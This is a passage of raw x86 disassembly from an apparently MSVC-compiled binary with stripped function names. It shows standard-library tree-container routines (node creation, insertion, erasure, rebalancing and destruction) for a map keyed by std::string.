mov [ esp + 0x18 ] edx
je r-xdata
mov edx [ ebp ]
mov eax [ edx + 0xc ]
cmp eax [ ebp ]
jae r-xdata
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
lea ecx [ esp + 0x18 ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
mov [ eax ] edx
pop ebp
pop ecx
retn 0x8
mov ecx [ esp + 0xc ]
push ebp
push esi
push ecx
lea edx [ esp + 0x24 ]
push edx
mov ecx edi
call sub_424c10
mov ecx [ eax ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
call sub_424240
mov edx [ esp + 0x18 ]
push ebp
push esi
push 0x1
push ecx
mov ecx edi
call sub_424c10
mov edx [ eax ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax + 0x4 ] 0x1
mov [ eax ] edx
pop ebp
pop ecx
retn 0x8
cmp edx [ eax + 0xc ]
setb cl
test cl cl
mov esi eax
mov [ esp + 0xc ] cl
je r-xdata
cmp [ eax + 0x11 ] 0x0
je r-xdata
sub_425520
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
mov esi ecx
call sub_4243f0
push edi
mov ecx esi
mov ebx eax
call sub_424100
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push eax
mov [ esp + 0x1c ] 0x0
call sub_4253a0
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop esi
pop ebx
retn 0x4
sub_425580
push esi
mov esi ecx
call sub_424880
mov [ esi + 0x4 ] eax
mov [ eax + 0x35 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_4255b0
push esi
mov esi ecx
call sub_424930
mov [ esi + 0x4 ] eax
mov [ eax + 0x11 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_4255e0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x11 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_424a80
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_425040
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
jmp r-xdata
sub_4256a0
push esi
mov esi ecx
call sub_424ac0
mov [ esi + 0x4 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_4256d0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov esi [ edi + 0x4 ]
mov cl [ esi + 0x45 ]
test cl cl
mov al 0x1
mov [ esp + 0x10 ] al
jne r-xdata
test al al
mov esi edi
mov [ esp + 0x1c ] esi
je r-xdata
mov edi edi
lea edx [ esi + 0xc ]
push ebp
push edx
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp edi [ ecx ]
jne r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x10 ]
push ebp
push edi
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebx
call sub_424ea0
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea ecx [ esp + 0x1c ]
call sub_423b90
mov esi [ esp + 0x1c ]
push ebp
push edi
push 0x1
lea edx [ esp + 0x28 ]
push edx
mov ecx ebx
call sub_424ea0
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0xc ]
push eax
push ebp
mov edi esi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov cl [ esi + 0x45 ]
test cl cl
je r-xdata
sub_4257b0
push 0xffffffff
push sub_432649
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
mov eax [ esp + 0x60 ]
push ebx
mov ebx ecx
mov cl [ eax + 0x45 ]
test cl cl
mov [ esp + 0x4 ] ebx
je r-xdata
push ebp
push esi
mov ebp eax
push edi
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] ebp
call sub_424460
mov eax [ ebp ]
mov cl [ eax + 0x45 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x58 ] 0x0
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x2c ]
call sub_40af50
push r--data
lea ecx [ esp + 0x2c ]
push ecx
call _CxxThrowException
mov edx [ ebp + 0x8 ]
mov cl [ edx + 0x45 ]
test cl cl
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x70 ]
cmp ecx ebp
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x45 ]
test al al
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebp ]
mov [ ecx ] edx
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x45 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebx + 0x4 ]
cmp [ ebx ] ebp
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax ] ebp
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
mov al [ edi + 0x45 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebp + 0x44 ]
mov al [ ecx + 0x44 ]
mov [ ecx + 0x44 ] dl
mov [ ebp + 0x44 ] al
mov al [ ebp + 0x44 ]
mov bl 0x1
cmp al bl
jne r-xdata
mov al [ edi + 0x45 ]
test al al
je r-xdata
push edi
call sub_423b60
add esp 0x4
mov eax esi
jmp r-xdata
or edi 0xffffffff
mov [ esp + 0x64 ] edi
lea esi [ ebp + 0xc ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x64 ] 0x2
lea ecx [ esi + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x64 ] edi
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebp
call ??3@YAXPAX@Z
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebp
jbe r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
cmp edi [ eax + 0x4 ]
je r-xdata
push edi
call sub_423b40
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov ecx [ esp + 0x64 ]
mov eax [ esp + 0x60 ]
mov [ eax ] ecx
mov ecx [ esp + 0x50 ]
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x44 ] bl
jmp r-xdata
cmp [ edi + 0x44 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov dl [ eax + 0x44 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x44 ]
test dl dl
jne r-xdata
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov [ eax + 0x44 ] bl
push esi
mov [ esi + 0x44 ] 0x0
call sub_423950
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov [ eax + 0x44 ] bl
push esi
mov [ esi + 0x44 ] 0x0
call sub_424390
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov edi esi
cmp edi edx
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x44 ] bl
je r-xdata
mov dl [ esi + 0x44 ]
mov [ eax + 0x44 ] dl
mov [ esi + 0x44 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x44 ] bl
call sub_423950
mov edx [ eax + 0x8 ]
mov [ edx + 0x44 ] bl
push eax
mov [ eax + 0x44 ] 0x0
call sub_424390
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x44 ] 0x0
mov dl [ esi + 0x44 ]
mov [ eax + 0x44 ] dl
mov [ esi + 0x44 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x44 ] bl
call sub_424390
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x44 ] bl
push eax
mov [ eax + 0x44 ] 0x0
call sub_423950
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x10 ]
sub_425a90
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x45 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_425a90
mov esi [ esi ]
mov ecx edi
call sub_423de0
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x45 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_425af0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4255e0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_425b20
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
push edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edi [ esp + 0x1c ]
push ebx
mov ebx [ esp + 0x1c ]
cmp ebx ecx
push ebp
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x4 ]
mov edi [ esp + 0x14 ]
push eax
push ecx
push 0x1
push edi
mov ecx esi
call sub_424ea0
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
cmp ebx eax
jne r-xdata
lea edx [ ebx + 0xc ]
push edx
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea eax [ ebx + 0xc ]
push eax
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov eax [ eax + 0x8 ]
add eax 0xc
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
push edi
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_4256d0
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
pop ebp
pop ebx
pop edi
mov [ eax ] ecx
pop esi
add esp 0x8
retn 0xc
push edi
mov edi [ esp + 0x20 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea eax [ ebx + 0xc ]
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_423b90
mov ebp [ esp + 0x24 ]
push edi
lea edx [ ebp + 0xc ]
push edx
mov ecx esi
call sub_40aa60
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push edi
mov edi [ esp + 0x20 ]
push ecx
push 0x0
push edi
mov ecx esi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_424460
mov ebp [ esp + 0x24 ]
cmp ebp [ esi + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x45 ]
push edi
mov edi [ esp + 0x20 ]
test cl cl
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
mov al [ edx + 0x45 ]
test al al
push edi
mov edi [ esp + 0x20 ]
mov ecx esi
je r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push edi
mov ecx esi
call sub_40aa60
test al al
je r-xdata
push ebx
push 0x1
push edi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x0
push edi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x1
push edi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebx
push 0x0
push edi
call sub_424ea0
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
sub_425ce0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_425a90
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_425d10
push ebp
mov ebp esp
push 0xffffffff
push sub_432660
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x18 ] esi
mov eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov ebx [ ebp + 0x8 ]
mov al [ ebx + 0x45 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x44 ]
push ecx
lea edx [ ebx + 0xc ]
push edx
push eax
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov ecx esi
call sub_4249e0
mov edi eax
mov edx [ ebp - 0x14 ]
mov al [ edx + 0x45 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
mov eax [ ebx ]
push eax
mov ecx esi
call sub_425d10
mov [ edi ] eax
push edi
mov ecx [ ebx + 0x8 ]
push ecx
mov ecx esi
call sub_425d10
mov [ edi + 0x8 ] eax
mov [ ebp - 0x14 ] edi
sub_425dd0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4255e0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_425e00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_432681
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebp
mov ebp [ esp + 0x68 ]
push esi
push edi
push ebp
mov edi ecx
call sub_424100
mov esi eax
cmp esi [ edi + 0x4 ]
je r-xdata
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x0
push eax
push ebp
lea ecx [ esp + 0x30 ]
call sub_4235c0
mov [ esp + 0x68 ] 0x1
push eax
push esi
lea eax [ esp + 0x78 ]
push eax
mov ecx edi
call sub_425b20
mov esi [ eax ]
mov [ esp + 0x68 ] 0x0
lea ecx [ esp + 0x28 ]
call sub_423480
mov [ esp + 0x68 ] 0xffffffff
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ esi + 0xc ]
push eax
push ebp
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x60 ]
pop edi
lea eax [ esi + 0x28 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x60
retn 0x4
sub_425eb0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x45 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_425a90
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_4257b0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
jmp r-xdata
sub_425f70
push ebx
mov ebx [ esp + 0x8 ]
mov eax [ ebx + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax + 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push edi
push ecx
mov ecx esi
call sub_425d10
mov [ edi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov cl [ eax + 0x45 ]
test cl cl
jne r-xdata
mov [ edx ] edx
mov esi [ esi + 0x4 ]
pop edi
mov [ esi + 0x8 ] esi
pop esi
pop ebx
retn 0x4
mov ecx [ eax ]
mov bl [ ecx + 0x45 ]
test bl bl
jne r-xdata
mov [ edx ] eax
mov esi [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
lea ebx [ ebx ]
pop edi
mov [ esi + 0x8 ] ecx
pop esi
pop ebx
retn 0x4
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov bl [ ecx + 0x45 ]
test bl bl
je r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
sub_426000
push 0xffffffff
push sub_432698
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4255e0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_426060
push 0xffffffff
push sub_4326b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_424930
mov [ esi + 0x4 ] eax
mov [ eax + 0x11 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4260c0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_425eb0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_4260f0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_425eb0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_426120
push ebp
mov ebp esp
push 0xffffffff
push sub_4326d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_424ac0
mov [ esi + 0x4 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_425f70
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4261b0
push 0xffffffff
push sub_4326e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_425eb0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_426210
push 0xffffffff
push sub_432714
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call sub_4261b0
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_426260
push 0xffffffff
push sub_432728
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_424ac0
mov [ esi + 0x4 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4262c0
push 0xffffffff
push sub_432748
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_426120
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_426310
push 0xffffffff
push sub_43277c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0x0
add edi 0x1c
lea ecx [ esi + 0x1c ]
push edi
mov [ esp + 0x20 ] ecx
call sub_426120
